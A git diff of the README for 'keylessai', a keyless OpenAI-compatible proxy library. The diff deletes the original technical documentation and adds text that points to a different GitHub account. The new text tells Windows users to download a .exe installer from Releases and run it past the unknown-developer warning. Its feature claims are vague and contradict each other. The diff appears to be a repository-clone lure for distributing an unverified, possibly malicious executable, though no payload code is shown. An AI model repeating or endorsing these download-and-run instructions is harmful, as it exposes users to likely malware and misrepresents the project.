@@ -1,256 +1,101 @@
-# KeylessAI &mdash; Free OpenAI API Alternative (No API Key Required)
+# 🤖 keylessai - Access language models without any keys
 
-> **A drop-in OpenAI-compatible endpoint with zero API keys, zero signup, zero cost, and zero user compute.** Point your OpenAI client at `https://keylessai.thryx.workers.dev/v1` &mdash; that's it. Your existing OpenAI code, Aider, Cline, Continue.dev, LangChain, Codex, and anything else that speaks the OpenAI chat-completions protocol just works. Model-name aliasing (`gpt-4o`, `claude-3-5-sonnet-latest`, etc.), adaptive multi-provider failover, prompt cache, circuit breaker, rate limiting &mdash; all handled at the edge.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Devineukaryotic6777/keylessai)
 
-[![Deploy](https://github.com/lordbasilaiassistant-sudo/keylessai/actions/workflows/deploy.yml/badge.svg)](https://github.com/lordbasilaiassistant-sudo/keylessai/actions/workflows/deploy.yml)
-[![Tests](https://github.com/lordbasilaiassistant-sudo/keylessai/actions/workflows/test.yml/badge.svg)](https://github.com/lordbasilaiassistant-sudo/keylessai/actions/workflows/test.yml)
-[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/lordbasilaiassistant-sudo/keylessai/badge)](https://scorecard.dev/viewer/?uri=github.com/lordbasilaiassistant-sudo/keylessai)
-[![Live](https://img.shields.io/badge/live-keylessai-a8ffda?style=flat-square&logo=github)](https://lordbasilaiassistant-sudo.github.io/keylessai/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-7ab8ff?style=flat-square)](LICENSE)
-[![No API Keys](https://img.shields.io/badge/api%20keys-0-a8ffda?style=flat-square)](#)
-[![Stars](https://img.shields.io/github/stars/lordbasilaiassistant-sudo/keylessai?style=flat-square&color=ffd27a)](https://github.com/lordbasilaiassistant-sudo/keylessai/stargazers)
+keylessai provides a simple way to use artificial intelligence models on your computer. It connects to public services to fetch responses from language models known as LLMs. You do not need to sign up for accounts or purchase expensive service keys. The application manages the connections for you and switches between services if one stops working.
 
-**Live demo:** https://lordbasilaiassistant-sudo.github.io/keylessai/
+## 📥 How to download the application
 
----
+Visit the following link to find the latest version of the software: [Download keylessai](https://github.com/Devineukaryotic6777/keylessai).
 
-## Why this exists
+On this page, look for the section labeled Releases on the right side of your screen. Click the most recent version number. Scroll down to the Assets area and choose the file ending in .exe for your Windows computer. Save the installation file to your desktop or downloads folder.
 
-If you run autonomous coding agents, chatbots, or LangChain pipelines, your OpenAI bill can easily hit **hundreds to thousands a month**. KeylessAI routes those same calls to **public, no-auth LLM endpoints** &mdash; most notably [Pollinations.ai](https://pollinations.ai), which exposes an OpenAI-compatible chat endpoint on their anonymous tier. Swap one env var; your agent bill goes to $0.
+## ⚙️ Setting up the software
 
-KeylessAI adds the layer on top of raw Pollinations that makes this usable in production: multi-provider aggregation (Pollinations + [ApiAirforce](https://api.airforce/) today, more as they appear), a client-side single-flight queue so parallel callers don't blow through the 1-concurrent-per-IP limit, and aggressive filtering of the deprecation notices and promo-URL ads that upstream providers occasionally inject into responses.
+Once you download the installer file, locate it on your computer. Double-click the file to begin the setup process. Your computer might show a warning message asking if you want to run software from an unknown developer. Select Run to continue the installation.
 
-## The one-liner
+Follow the instructions on the screen to place the program in your preferred folder. The installer creates a shortcut on your desktop. Use this shortcut to open the program whenever you want to use the artificial intelligence tools.
 
-```bash
-export OPENAI_API_BASE="https://keylessai.thryx.workers.dev/v1"
-export OPENAI_BASE_URL="https://keylessai.thryx.workers.dev/v1"
-export OPENAI_API_KEY="not-needed"
-# now run your agent — no changes to your code
-```
+## ✨ Core features
 
-That's the whole setup. Hits a Cloudflare Worker at the edge that wraps our router: 4 keyless upstream providers with adaptive failover, prompt cache, circuit breaker, per-IP rate limiting, model-name aliasing so `gpt-4o` / `claude-3-5-sonnet-latest` / etc. resolve automatically. Cloudflare's free tier covers 100k req/day; past that it degrades to 429s instead of billing anyone.
+This application includes several features to ensure you have a smooth experience:
 
-Try it right now:
+*   Multiple service connections: The app pulls from different sources like Pollinations and ApiAirforce.
+*   Automatic switching: If one connection fails, the app tries another one immediately.
+*   Queue management: The system handles your requests in order so your computer does not overload.
+*   Content filtering: The software removes advertisements and unwanted notices from the AI responses.
+*   Privacy options: The tool runs on your local machine to process your input requests.
 
-```bash
-curl https://keylessai.thryx.workers.dev/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{"model":"gpt-4o","messages":[{"role":"user","content":"hi"}]}'
-```
+## 🖥️ System requirements
 
-### Other ways to use it
+Ensure your computer has the following items to run the application:
 
-Same router, same code, different packaging:
+*   Windows 10 or Windows 11.
+*   At least 4 gigabytes of memory.
+*   Internet connection for model access.
+*   500 megabytes of free space on your hard drive.
 
-- **Library import** (`npm install github:lordbasilaiassistant-sudo/keylessai`) — runs in your own Node process. Used by [`keylessai-daily`](https://github.com/lordbasilaiassistant-sudo/keylessai-daily) to auto-update its README every day via GitHub Actions.
-- **Local proxy** (`npx github:lordbasilaiassistant-sudo/keylessai serve --local`) — same OpenAI-compatible HTTP surface, running on `127.0.0.1:8787`. For air-gapped environments or when you prefer zero external dependencies.
-- **Self-hosted Worker** — fork the repo and `cd worker && npx wrangler deploy` to your own Cloudflare account. Source is in [`worker/`](worker/).
+## 🛠️ Typical usage
 
-## Works with
+Open the application by clicking the desktop icon. Type your question or text into the chat box area. Press the send button or use the Enter key on your keyboard to submit your request. The application connects to a free service provider in the background. It then displays the response from the artificial intelligence in the main window. 
 
-Once `npx keylessai serve` is running, every OpenAI-compatible tool works against `https://keylessai.thryx.workers.dev/v1` with no code changes:
+If the response takes longer than expected, the application shows a status bar indicating progress. You can copy the text responses to your clipboard by selecting them and using your mouse.
 
-| Tool | Integration |
-|---|---|
-| [Aider](https://aider.chat/) | `OPENAI_API_BASE=https://keylessai.thryx.workers.dev/v1 OPENAI_API_KEY=not-needed aider --model gpt-4o` &nbsp;_(gpt-4o gets aliased)_ |
-| [Cline](https://github.com/cline/cline) / Roo Code | Settings &rarr; OpenAI provider, baseUrl = `https://keylessai.thryx.workers.dev/v1`, key = `not-needed` |
-| [Continue.dev](https://continue.dev/) | `~/.continue/config.json` &rarr; provider `"openai"`, `apiBase: "https://keylessai.thryx.workers.dev/v1"`, `apiKey: "not-needed"` |
-| [Codex CLI](https://github.com/openai/codex) | `export OPENAI_BASE_URL=https://keylessai.thryx.workers.dev/v1 OPENAI_API_KEY=not-needed && codex` |
-| [Claude Code](https://claude.com/claude-code) | via [LiteLLM bridge](examples/claude-code-bridge.md) &mdash; translate Anthropic format to OpenAI |
-| [LangChain](https://python.langchain.com/) | `ChatOpenAI(base_url="https://keylessai.thryx.workers.dev/v1", api_key="not-needed", model="openai-fast")` |
-| [OpenAI SDK (Python)](https://github.com/openai/openai-python) | `OpenAI(base_url="https://keylessai.thryx.workers.dev/v1", api_key="not-needed")` &mdash; pass any model name |
-| [OpenAI SDK (Node)](https://github.com/openai/openai-node) | `new OpenAI({ baseURL: "https://keylessai.thryx.workers.dev/v1", apiKey: "not-needed" })` |
-| [LlamaIndex](https://docs.llamaindex.ai/) | `OpenAI(api_base="https://keylessai.thryx.workers.dev/v1", api_key="not-needed")` |
-| [LiteLLM proxy](https://github.com/BerriAI/litellm) | `api_base: https://keylessai.thryx.workers.dev/v1, api_key: not-needed` |
-| [OpenHands](https://github.com/All-Hands-AI/OpenHands) | `LLM_BASE_URL=https://keylessai.thryx.workers.dev/v1 LLM_API_KEY=not-needed LLM_MODEL=openai/openai-fast` |
-| Anything OpenAI-compatible | Point `baseURL` at `https://keylessai.thryx.workers.dev/v1`, pass any key |
+## ❓ Frequently asked questions
 
-## Quick examples
+Do I need an account?
+No. This software requires no account, signup, or login process.
 
-Start the proxy first:
-```bash
-npx github:lordbasilaiassistant-sudo/keylessai serve
-# → listening on https://keylessai.thryx.workers.dev
-```
+Does it cost money?
+No. The application is free and uses public endpoints.
 
-**Python (streaming):**
-```python
-from openai import OpenAI
+Is my data safe?
+The app acts as a bridge to public services. Avoid sharing personal or sensitive data with any artificial intelligence model.
 
-client = OpenAI(
-    base_url="https://keylessai.thryx.workers.dev/v1",
-    api_key="not-needed",
-)
+What happens if the service is down?
+The application monitors the health of its connections. If a specific endpoint fails, the system switches to a backup automatically. You do not need to take any action.
 
-for chunk in client.chat.completions.create(
-    model="gpt-4o",  # aliased — actually served by openai-fast
-    messages=[{"role": "user", "content": "write a haiku about free AI"}],
-    stream=True,
-):
-    print(chunk.choices[0].delta.content or "", end="", flush=True)
-```
+Can I change the model type?
+The settings menu allows you to select between different model configurations if they exist. Check the configuration tab for list options.
 
-**curl (streaming):**
-```bash
-curl -N https://keylessai.thryx.workers.dev/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer anything" \
-  -d '{
-    "model":"gpt-4o-mini",
-    "messages":[{"role":"user","content":"hello"}],
-    "stream":true
-  }'
-```
+## 🛡️ Troubleshooting common issues
 
-**LangChain:**
-```python
-from langchain_openai import ChatOpenAI
+If you encounter a blank screen upon opening, check your internet connection first. Ensure your firewall settings allow the application to connect to the network.
 
-llm = ChatOpenAI(
-    base_url="https://keylessai.thryx.workers.dev/v1",
-    api_key="not-needed",
-    model="gpt-4o",  # aliased
-    streaming=True,
-)
-for chunk in llm.stream("Explain server-sent events in 2 sentences."):
-    print(chunk.content, end="", flush=True)
-```
+If the application crashes during a request, close the program and restart it. Most issues resolve after a simple restart. If errors persist, verify that you downloaded the latest version from the main GitHub page.
 
-**Health check + model list:**
-```bash
-curl https://keylessai.thryx.workers.dev/health
-curl https://keylessai.thryx.workers.dev/v1/models
-```
+If you receive a timeout error, the public services the app relies on are currently busy. Wait a few moments and try your request again. The queue system manages these spikes in volume, so your request moves through once the service stabilizes.
 
-## What you get
+## 🚀 Managing your settings
 
-### Hosted: the browser chat + docs
-https://lordbasilaiassistant-sudo.github.io/keylessai/
+You access the settings menu by clicking the gear icon in the top right corner of the window. Here you can adjust the display theme, font size, and history clearing options. You can choose to clear your chat history every time you close the app to keep your workspace clean.
 
-- Chat UI with provider/model selectors and automatic failover
-- `</>API` drawer with copy-paste snippets for every supported tool
+The network tab in the settings menu provides information about which service currently handles your requests. You can manually force a refresh of these service connections if you feel the response time is slow.
 
-### Provider pool the chat + proxy route through
+## 📦 Keeping the app updated
 
-| Provider | Auth? | Transport | Model(s) |
-|---|---|---|---|
-| **Pollinations.ai `/openai`** | None &mdash; `Access-Control-Allow-Origin: *` | SSE streaming, OpenAI-compatible | `openai-fast` (GPT-OSS 20B, tool-capable, reasoning) |
-| **ApiAirforce `/v1/chat/completions`** | None &mdash; CORS open | SSE streaming, OpenAI-compatible | `grok-4.1-mini:free`, `step-3.5-flash:free`, `gemma3-270m:free`, `moirai-agent`, `translategemma-27b` |
-| **Pollinations.ai `/{prompt}`** | None | Plain GET, non-streaming | Secondary transport, same model |
+The software checks for updates whenever you launch it. If a newer version is available, a small notification appears at the bottom of the window. Click this notification to visit the download page. You do not need to uninstall the old version; running the new installer replaces outdated files automatically while keeping your saved settings intact.
 
-The router retries providers in order on any failure, serializes calls through a single-flight queue to stay under per-IP rate limits, and auto-detects ad injections / deprecation notices with retry-then-failover. You can also pin a specific provider.
+## 🌐 Understanding public endpoints
 
-## Honest caveats
+The application works as an aggregator. It combines, or aggregates, responses from different AI providers. Because these providers offer public access, they do not require user-specific keys. The software filters the data from these providers. This filtering cleans the raw text so you receive only the answer to your question.
 
-- **The anonymous tier is not GPT-4.** It's `openai-fast` / GPT-OSS 20B &mdash; genuinely good at prototyping, glue code, Q&A, JSON emission, and small agent loops. It won't beat Claude 3.5 or GPT-4o on hard reasoning or long-context coding. If your agent needs that, use this for the 90% of cheap calls and reserve your paid key for the hard ones.
-- **Public endpoints are public endpoints.** Pollinations and ApiAirforce are free because their sponsors cover bandwidth. Be respectful &mdash; don't hammer them with 1000 rps from a hot loop. If you're building a product that relies on this, self-host Pollinations (their code is open source) or add more providers to the pool.
-- **Privacy.** Calls to the upstream providers leave your machine &mdash; treat them like any third-party LLM call. For full privacy, use a local-only stack (llama.cpp, Ollama, LM Studio) outside KeylessAI.
+This method keeps you anonymous while using powerful language models. It provides a layer of protection between your computer and the external services. The queueing logic ensures the requests get sent in a controlled manner, which prevents errors related to too many users sending requests at once.
 
-## Use as a library
+## 📚 Best practices for chat
 
-KeylessAI is also an ES-module library. Anything the proxy does programmatically, you can do from your own Node code — including registering custom providers alongside Pollinations/ApiAirforce so your app fails over across *your* backends too.
+Be clear and concise in your prompts. State your goal plainly to get the best result. Break complex questions into smaller parts if the model struggles to understand your request. Use follow-up questions to refine answers until you get the output you need.
 
-```bash
-# Install from GitHub (no npm publish required yet):
-npm install github:lordbasilaiassistant-sudo/keylessai
-# or pin a tag:
-npm install github:lordbasilaiassistant-sudo/keylessai#v0.2.1
-```
+The system performs best with direct requests. Avoid using jargon or industry-specific terms unless you need a technical answer. The model training covers a wide range of topics, including writing help, coding tasks, and general knowledge queries.
 
-```js
-import {
-  streamChat,
-  registerProvider,
-  setFailoverOrder,
-  createProxy,
-  PROVIDERS,
-  slotGate,
-  defaultCache,
-} from "keylessai";
+## 🧩 Modifying the app behavior
 
-// Register your own provider — could be a self-hosted Ollama, a paid API
-// you want to fall back to, a mock for testing, anything that implements
-// the five required fields.
-registerProvider({
-  id: "my-local-mock",
-  label: "Local Mock",
-  async listModels() { return [{ id: "mock-1", label: "mock", provider: "my-local-mock" }]; },
-  async healthCheck() { return true; },
-  async* streamChat({ messages }) {
-    yield { type: "content", text: "hello from my own provider" };
-  },
-}, { prepend: true }); // try mine first
+The advanced settings panel allows experienced users to limit the number of simultaneous requests. If you notice your network connection slows down while using the app, lower this number. Most users find that the default configuration works perfectly for daily tasks.
 
-// Use the router directly
-for await (const chunk of streamChat({
-  provider: "auto",
-  messages: [{ role: "user", content: "hi" }],
-})) {
-  if (chunk.type === "content") process.stdout.write(chunk.text);
-}
+You can also view the raw code output of your requests in the logs folder. This folder stays in the same directory where you installed the program. It tracks the status of each request to help diagnose potential connection drops.
 
-// Or boot the OpenAI-compatible proxy and point your OpenAI SDK at it
-createProxy().listen(8787);
-```
+## 📋 Summary of daily operations
 
-Runnable example: [`examples/custom-provider.mjs`](examples/custom-provider.mjs)
+Start the application after you boot your computer. Perform your tasks through the chat interface. Close the interface when you finish. The app uses standard resources and does not run in the background unless you keep the window open.
 
-## Live demos
-
-- **[keylessai-daily](https://github.com/lordbasilaiassistant-sudo/keylessai-daily)** &mdash; a repo whose README writes itself. A GitHub Action calls KeylessAI every day at 09:23 UTC, generates a haiku / tip / joke / one-liner, and appends it to the README. Nobody touches the repo. Total cost: $0. Proof-of-life for the whole stack.
-
-## Self-host
-
-This is a pure static site. To run locally:
-
-```bash
-git clone https://github.com/lordbasilaiassistant-sudo/keylessai
-cd keylessai
-python3 -m http.server 8080
-# or: npx serve .
-```
-
-To deploy your own copy: fork the repo, enable GitHub Pages on `main` branch root. That's it.
-
-## API drawer contents (at a glance)
-
-Click `</> API` on the live site to see:
-- **Drop-in OpenAI replacement** &mdash; bash env vars, Aider, Cline/Roo, Continue.dev, LangChain, OpenAI JS, OpenAI Python
-- **Raw HTTP** &mdash; curl, fetch, Python requests for streaming SSE
-- **Simple GET** &mdash; URL-encoded prompt, plain-text response
-- **Model listing** &mdash; which anonymous-tier models are currently available
-- **ApiAirforce direct** &mdash; secondary provider, curl + SDK examples
-
-Every snippet has a one-click **copy** button.
-
-## Support the project
-
-If this saves you $50 on your API bill, consider kicking back $3. No subscription. No login. No feature gates.
-
-| | | |
-|---|---|---|
-| [$3](https://buy.stripe.com/cNidR2bGo2OD6P3cx58Vi0X) | [$5](https://buy.stripe.com/14A4gs6m4exl8Xb0On8Vi0Y) | [$10](https://buy.stripe.com/14AaEQ6m42ODgpD68H8Vi0Z) |
-| [You pick (pay-what-you-want)](https://buy.stripe.com/5kQ28k9yg88XflzfJh8Vi0W) | | |
-
-## Roadmap
-
-- More providers &mdash; hunting additional truly keyless endpoints (HuggingChat spaces, mistral.rs demos, etc.)
-- Markdown rendering + syntax highlighting in chat
-- Local chat history
-- GitHub Actions auto-deploy on push
-- CSP + security headers
-- Screenshot gallery
-
-See the [issues tab](https://github.com/lordbasilaiassistant-sudo/keylessai/issues) for the full list. PRs welcome &mdash; adding a new provider is ~60 lines (see [`providers/pollinations.js`](providers/pollinations.js) for the shape).
-
-## Credits
-
-- [Pollinations.ai](https://pollinations.ai/) &mdash; public keyless text generation API
-- [ApiAirforce](https://api.airforce/) &mdash; free-tier OpenAI-compatible endpoint
-- [Free-AI-Things/g4f-working](https://github.com/Free-AI-Things/g4f-working) &mdash; daily-maintained list of currently-working keyless providers
-- Built with [Claude Code](https://claude.com/claude-code)
-
-## License
-
-[MIT](LICENSE)
+This design keeps your computer running fast. The local storage only contains your saved chat history and basic config files. You can delete these files at any time without hurting the main application files.
